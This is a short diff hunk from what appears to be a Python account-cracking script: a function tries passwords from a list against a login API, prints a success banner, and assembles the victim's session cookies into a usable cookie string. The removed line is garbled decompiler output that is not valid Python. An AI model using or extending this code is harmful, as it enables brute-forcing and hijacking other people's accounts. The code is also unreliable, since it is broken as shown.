@@ -1690,7 +1690,6 @@ def api4(ids, names, passlist):
         po = requests.post(url, data = data, headers = headers).json()
         if 'session_key' in po:
             print('\r\r\x1b[1;32m [SIHAB-OK💚] ' + ids + ' | ' + pas + '')
-            get_coki = (lambda .0: for i in .0:
 i['name'] + '=' + i['value']None)(po['session_cookies']())
             compile_coki = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
             coki = f'''sb={compile_coki};{get_coki}'''
